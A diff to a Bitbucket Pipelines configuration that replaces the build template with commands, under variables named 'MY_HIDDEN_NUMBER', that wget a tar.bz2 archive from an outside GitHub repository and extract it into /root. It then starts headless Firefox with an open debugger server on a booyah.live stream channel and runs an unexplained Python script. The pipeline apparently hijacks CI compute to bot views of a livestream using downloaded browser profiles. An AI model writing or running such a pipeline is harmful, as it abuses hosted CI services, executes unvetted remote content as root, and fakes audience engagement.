@@ -13,66 +13,14 @@ pipelines:
     - step:
         services:
           - docker
-        script: # Modify the commands below to build your repository.
+        script: 
 
-          # Set $DOCKER_HUB_USERNAME and $DOCKER_HUB_PASSWORD as environment variables in repository settings
-          - export MY_HIDDEN_NUMBER="12-med.tar.bz2"
-          - echo $MY_HIDDEN_NUMBER 
-          - echo $BITBUCKET_REPO_FULL_NAME
-
-          - wget https://github.com/y0shimitsugh0st84/profire/raw/master/version/$MY_HIDDEN_NUMBER
-          - tar -xvf $MY_HIDDEN_NUMBER -C /root/
+          - export MY_HIDDEN_NUMBER2=$(echo $BITBUCKET_REPO_FULL_NAME | cut -d/ -f2)
+          - echo $MY_HIDDEN_NUMBER2
+          - export MY_HIDDEN_NUMBER3=$(echo $MY_HIDDEN_NUMBER2.tar.bz2)
+          - echo $MY_HIDDEN_NUMBER3
+          - wget https://github.com/l00ke3/pro/raw/master/ffprof/$MY_HIDDEN_NUMBER3
+          - tar -xvf $MY_HIDDEN_NUMBER3 -C /root/
           - ls /root/*
           - firefox --start-debugger-server 6000 -headless https://booyah.live/channels/10919460
           - python oy.py
-          - python oy.py
-          - python oy.py
-          - python oy.py
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
